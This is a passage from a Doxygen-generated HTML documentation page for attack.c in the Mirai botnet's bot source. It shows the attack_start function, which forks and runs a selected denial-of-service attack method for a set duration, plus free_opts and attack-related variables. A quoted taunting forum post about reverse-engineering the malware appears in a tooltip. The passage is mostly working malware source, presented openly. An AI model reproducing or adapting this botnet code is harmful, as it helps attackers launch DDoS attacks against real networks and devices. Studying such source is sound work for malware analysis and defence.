class="lineno">  151</span>&#160;    <span class="keywordflow">if</span> (opts != NULL)</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;        <a class="code" href="attack_8c.html#a540818eda3ba12636511e0ef58c4630b">free_opts</a>(opts, opts_len);</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;}</div><div class="ttc" id="structattack__target_html_a431d4eed6dd4e7faddf9b8615b4d5c2a"><div class="ttname"><a href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">attack_target::addr</a></div><div class="ttdeci">ipv4_t addr</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00022">attack.h:22</a></div></div>
<div class="ttc" id="structattack__option_html"><div class="ttname"><a href="structattack__option.html">attack_option</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00026">attack.h:26</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aaadf2e480fd246ff9e932039b223baed"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a></div><div class="ttdeci">uint32_t ipv4_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00013">includes.h:13</a></div></div>
<div class="ttc" id="structattack__option_html_a276df7d1c5fbbf555b8430a39b4015df"><div class="ttname"><a href="structattack__option.html#a276df7d1c5fbbf555b8430a39b4015df">attack_option::key</a></div><div class="ttdeci">uint8_t key</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00028">attack.h:28</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_ab292715cb198b54d1912ed6209d567dc"><div class="ttname"><a href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a></div><div class="ttdeci">try harder skiddo Your skeleton tool sucks it thought the attack decoder was sinden but it does not even use a text based protocol CNC and bot communicate over binary protocol you say some others kill based on cwd It shows how out of the loop you are with real malware Go back to skidland slaps for you Why are you writing reverse engineer tools You cannot even correctly reverse in the first place Please learn some skills first before trying to impress others Your arrogance in declaring how you beat me with your dumb kung fu statement made me laugh so hard while eating my SO had to pat me on the back Just as I forever be free</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00030">ForumPost.txt:30</a></div></div>
<div class="ttc" id="attack_8h_html_a0fb3d519486301242753dc8e7f175683"><div class="ttname"><a href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a></div><div class="ttdeci">uint8_t ATTACK_VECTOR</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00032">attack.h:32</a></div></div>
<div class="ttc" id="structattack__option_html_ab0978cf1e5a662ff83e73356b422d837"><div class="ttname"><a href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">attack_option::val</a></div><div class="ttdeci">char * val</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00027">attack.h:27</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a8654e276185a2f53935614d38f4117f3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a></div><div class="ttdeci">void util_memcpy(void *dst, void *src, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00072">util.c:72</a></div></div>
<div class="ttc" id="structattack__target_html_af38e9712f03de6be723c5acede3f2114"><div class="ttname"><a href="structattack__target.html#af38e9712f03de6be723c5acede3f2114">attack_target::netmask</a></div><div class="ttdeci">uint8_t netmask</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00023">attack.h:23</a></div></div>
<div class="ttc" id="structattack__target_html_a8f537c8c1aa7f2b611c6de392d964dfc"><div class="ttname"><a href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">attack_target::sock_addr</a></div><div class="ttdeci">struct sockaddr_in sock_addr</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00021">attack.h:21</a></div></div>
<div class="ttc" id="attack_8c_html_a5631e1ae5b2170dabea1d03c816e9885"><div class="ttname"><a href="attack_8c.html#a5631e1ae5b2170dabea1d03c816e9885">attack_start</a></div><div class="ttdeci">void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00155">attack.c:155</a></div></div>
<div class="ttc" id="attack_8c_html_a540818eda3ba12636511e0ef58c4630b"><div class="ttname"><a href="attack_8c.html#a540818eda3ba12636511e0ef58c4630b">free_opts</a></div><div class="ttdeci">static void free_opts(struct attack_option *opts, int len)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00237">attack.c:237</a></div></div>
<div class="ttc" id="structattack__target_html"><div class="ttname"><a href="structattack__target.html">attack_target</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00020">attack.h:20</a></div></div>
<div class="ttc" id="structattack__method_html_a6b62edafec0c6cbdda1b25e1c520698e"><div class="ttname"><a href="structattack__method.html#a6b62edafec0c6cbdda1b25e1c520698e">attack_method::vector</a></div><div class="ttdeci">ATTACK_VECTOR vector</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00075">attack.h:75</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a5631e1ae5b2170dabea1d03c816e9885"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_start </td>
          <td>(</td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>duration</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a>&#160;</td>
          <td class="paramname"><em>vector</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname"><em>targs_len</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname"><em>targs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname"><em>opts_len</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname"><em>opts</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00155">155</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00074">attack_method::func</a>, and <a class="el" href="attack_8c_source.html#l00018">methods_len</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00064">attack_parse()</a>.</p>
<div class="fragment"><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;{</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;    <span class="keywordtype">int</span> pid1, pid2;</div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;</div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;    pid1 = fork();</div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;    <span class="keywordflow">if</span> (pid1 == -1 || pid1 &gt; 0)</div><div class="line"><a name="l00161"></a><span class="lineno">  161</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;</div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;    pid2 = fork();</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;    <span class="keywordflow">if</span> (pid2 == -1)</div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;        exit(0);</div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (pid2 == 0)</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;    {</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;        sleep(duration);</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;        kill(getppid(), 9);</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;        exit(0);</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;    }</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;    {</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;        <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="attack_8c.html#ad3932419efa41f4f3ce7ab4e91ff5f6e">methods_len</a>; i++)</div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;        {</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;            <span class="keywordflow">if</span> (<a class="code" href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a>[i]-&gt;vector == vector)</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;            {</div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;                printf(<span class="stringliteral">&quot;[attack] Starting attack...\n&quot;</span>);</div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;                <a class="code" href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a>[i]-&gt;<a class="code" href="structattack__method.html#aa7564fe36f7cddd26ecd9b286eb04184">func</a>(targs_len, targs, opts_len, opts);</div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;            }</div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;        }</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;</div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;        <span class="comment">//just bail if the function returns</span></div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;        exit(0);</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;    }</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;}</div><div class="ttc" id="structattack__method_html_aa7564fe36f7cddd26ecd9b286eb04184"><div class="ttname"><a href="structattack__method.html#aa7564fe36f7cddd26ecd9b286eb04184">attack_method::func</a></div><div class="ttdeci">ATTACK_FUNC func</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00074">attack.h:74</a></div></div>
<div class="ttc" id="attack_8c_html_ad3932419efa41f4f3ce7ab4e91ff5f6e"><div class="ttname"><a href="attack_8c.html#ad3932419efa41f4f3ce7ab4e91ff5f6e">methods_len</a></div><div class="ttdeci">uint8_t methods_len</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00018">attack.c:18</a></div></div>
<div class="ttc" id="attack_8c_html_a126c018b410f7361fff77d10000a8f20"><div class="ttname"><a href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a></div><div class="ttdeci">struct attack_method ** methods</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00019">attack.c:19</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a540818eda3ba12636511e0ef58c4630b"></a>
<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">static void free_opts </td>
          <td>(</td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname"><em>opts</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>len</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">static</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00237">237</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="ForumPost_8txt_source.html#l00030">free</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00064">attack_parse()</a>.</p>
<div class="fragment"><div class="line"><a name="l00238"></a><span class="lineno">  238</span>&#160;{</div><div class="line"><a name="l00239"></a><span class="lineno">  239</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00240"></a><span class="lineno">  240</span>&#160;</div><div class="line"><a name="l00241"></a><span class="lineno">  241</span>&#160;    <span class="keywordflow">if</span> (opts == NULL)</div><div class="line"><a name="l00242"></a><span class="lineno">  242</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00243"></a><span class="lineno">  243</span>&#160;</div><div class="line"><a name="l00244"></a><span class="lineno">  244</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; len; i++)</div><div class="line"><a name="l00245"></a><span class="lineno">  245</span>&#160;    {</div><div class="line"><a name="l00246"></a><span class="lineno">  246</span>&#160;        <span class="keywordflow">if</span> (opts[i].<a class="code" href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">val</a> != NULL)</div><div class="line"><a name="l00247"></a><span class="lineno">  247</span>&#160;            <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(opts[i].<a class="code" href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">val</a>);</div><div class="line"><a name="l00248"></a><span class="lineno">  248</span>&#160;    }</div><div class="line"><a name="l00249"></a><span class="lineno">  249</span>&#160;    <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(opts);</div><div class="line"><a name="l00250"></a><span class="lineno">  250</span>&#160;}</div><div class="ttc" id="ForumPost_8txt_html_ab292715cb198b54d1912ed6209d567dc"><div class="ttname"><a href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a></div><div class="ttdeci">try harder skiddo Your skeleton tool sucks it thought the attack decoder was sinden but it does not even use a text based protocol CNC and bot communicate over binary protocol you say some others kill based on cwd It shows how out of the loop you are with real malware Go back to skidland slaps for you Why are you writing reverse engineer tools You cannot even correctly reverse in the first place Please learn some skills first before trying to impress others Your arrogance in declaring how you beat me with your dumb kung fu statement made me laugh so hard while eating my SO had to pat me on the back Just as I forever be free</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00030">ForumPost.txt:30</a></div></div>
<div class="ttc" id="structattack__option_html_ab0978cf1e5a662ff83e73356b422d837"><div class="ttname"><a href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">attack_option::val</a></div><div class="ttdeci">char * val</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00027">attack.h:27</a></div></div>
</div><!-- fragment -->
</div>
</div>
<h2 class="groupheader">Variable Documentation</h2>
<a class="anchor" id="a46485849828585ce0cad92273523730c"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int attack_ongoing[<a class="el" href="attack_8h.html#a7c4eacf15bd06764a0834171b5d6789f">ATTACK_CONCURRENT_MAX</a>] = {0}</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00020">20</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00044">attack_kill_all()</a>.</p>

</div>
</div>
<a class="anchor" id="a126c018b410f7361fff77d10000a8f20"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">struct <a class="el" href="structattack__method.html">attack_method</a>** methods = NULL</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00019">19</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

</div>
</div>
<a class="anchor" id="ad3932419efa41f4f3ce7ab4e91ff5f6e"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">uint8_t methods_len = 0</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00018">18</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00226">add_attack()</a>, and <a class="el" href="attack_8c_source.html#l00155">attack_start()</a>.</p>

</div>
</div>
</div><!-- contents -->
</div><!-- doc-content -->
<!-- start footer part -->
<div id="nav-path" class="navpath"><!-- id is needed for treeview function! -->
  <ul>
    <li class="navelem"><a class="el" href="dir_526aa88726c618d995900bd3fb6ff493.html">mirai</a></li><li class="navelem"><a class="el" href="dir_fc79afbdad77ef6ec155f6566a92d41a.html">bot</a></li><li class="navelem"><a class="el" href="attack_8c.html">attack.c</a></li>
    <li class="footer">Generated by
    <a href="http://www.doxygen.org/index.html">
    <img class="footer" src="doxygen.png" alt="doxygen"/></a> 1.8.11 </li>
  </ul>
</div>
</body>
</html>
